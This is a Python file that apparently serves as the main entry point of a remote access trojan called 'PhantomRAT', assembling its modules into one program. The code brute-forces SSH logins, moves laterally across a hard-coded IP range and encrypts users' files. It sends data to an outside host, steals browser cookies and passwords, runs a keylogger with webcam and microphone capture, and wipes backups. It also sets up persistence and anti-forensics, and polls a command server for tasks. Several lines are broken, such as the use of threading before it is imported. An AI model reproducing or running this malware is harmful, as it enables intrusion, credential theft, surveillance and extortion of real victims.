# PhantomRAT Malware Main Entry Point
# This is the assembled malware, integrating all modules

from phantomrat_loader import load_and_execute_payload
from phantomrat_business import adapt_activity, prioritize_targets
from phantomrat_network import map_network
from phantomrat_lateral import brute_ssh, lateral_move
from phantomrat_extortion import encrypt_file, exfil_data, wipe_backups, chat_bot
from phantomrat_lol import recon_system
import sys
keylogger = None
try:
    from phantomrat_keylogger import Keylogger
    from phantomrat_screencap import capture_screen
    from phantomrat_webcam import capture_webcam
    from phantomrat_mic import record_audio
except ImportError:
    print("GUI modules not available, running in headless mode.")
from phantomrat_process import list_processes, kill_process, start_process
from phantomrat_privilege import elevate_privileges
from phantomrat_fileops import list_files, download_file, upload_file
from phantomrat_browser import exfil_chrome_cookies, exfil_chrome_passwords
from phantomrat_sysinfo import get_system_info
from phantomrat_persistence import add_persistence
from phantomrat_survival import self_heal, anti_removal, self_delete_if_detected
from phantomrat_takeover import privilege_escalation, full_system_takeover, install_backdoor, exfil_system_data
from phantomrat_cloud import exfil_via_drive, fetch_task
from phantomrat_modules import load_module_from_cloud
import os
import time
import random
import json

def handle_command(task):
    if 'cmd' in task:
        cmd = task['cmd']
        if cmd == 'load_module':
            module = load_module_from_cloud(task['module_id'])
            module.run()  # Assume module has run()
        elif cmd == 'keylog':
            keylogger.start()
        elif cmd == 'screen':
            capture_screen()
        elif cmd == 'webcam':
            capture_webcam()
        elif cmd == 'mic':
            record_audio()
        elif cmd == 'sysinfo':
            info = get_system_info()
            exfil_data(info)
        elif cmd == 'files':
            files = list_files(task['path'])
            exfil_data({'files': files})
        elif cmd == 'download':
            data = download_file(task['file'])
            exfil_data({'file': data})
        elif cmd == 'upload':
            upload_file(task['file'], task['data'])
        # Add more

self_delete_if_detected()

# Load profile
with open('malleable_profile.json', 'r') as f:
    profile = json.load(f)

def main():
    # Adapt to environment
    adapt_activity()

    # Recon
    recon_system()

    # Map network
    map_network("141.105.71.0/24")

    # Lateral movement
    user, pwd = brute_ssh("141.105.71.196", "users.txt", "passes.txt")
    if user:
        lateral_move("141.105.71.196", user, pwd)

    # Extortion
    for root, dirs, files in os.walk('/home/user'):
        for file in files:
            if file.endswith('.txt'):
                encrypt_file(os.path.join(root, file), b'key')  # Use real key
    exfil_data({"data": "stolen"}, "http://141.105.71.196" + profile['http-post']['client']['uri'])
    add_persistence()
    anti_removal()
    from phantomrat_loader import api_unhook, anti_forensic
    api_unhook()
    anti_forensic()
    threading.Thread(target=self_heal, daemon=True).start()
    privilege_escalation()
    full_system_takeover()
    install_backdoor()
    exfil_system_data()

    # Advanced features
    if keylogger:
        try:
            keylogger = Keylogger()
            keylogger.start_logging()
        except ImportError:
            print("Keylogger not available, skipping.")
            keylogger = None
    else:
        print("Skipping keylogger in test mode.")

    # Sleep obfuscation
    def sleep_obfuscation(duration):
        end_time = time.time() + duration
        while time.time() < end_time:
            time.sleep(random.uniform(0.1, 1.0))
            # Do dummy operations
            _ = [i**2 for i in range(100)]

    # Status ping and task fetch
    import threading
    def status_ping():
        while True:
            interval = random.randint(30, 120)  # Random 30-120 seconds
            sleep_obfuscation(interval)
            status = {
                "alive": True,
                "environment": {"os": os.name, "hostname": os.uname().nodename},
                "payloads_deployed": ["keylogger", "screen", "webcam"],
                "control_level": "full" if os.getuid() == 0 else "partial",
                "keylog": keylogger.get_log()[-1000:] if keylogger else "test mode"
            }
            exfil_data(status)  # Use cloud
            # Fetch and handle task
            try:
                task = fetch_task()
                handle_command(task)
            except:
                pass

    threading.Thread(target=status_ping, daemon=True).start()
    wipe_backups()
    chat_bot()

if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1 and sys.argv[1] == "--test":
        print("Test mode: Simulating RAT startup...")
        print("System info:", get_system_info())
        print("Network map: Scanning 127.0.0.0/24...")
        map_network("127.0.0.0/24")
        print("Simulating task: sysinfo")
        task = {"cmd": "sysinfo"}
        handle_command(task)
        print("Simulating task: files")
        task = {"cmd": "files", "path": "/home/user"}
        handle_command(task)
        print("Test complete.")
    else:
        main()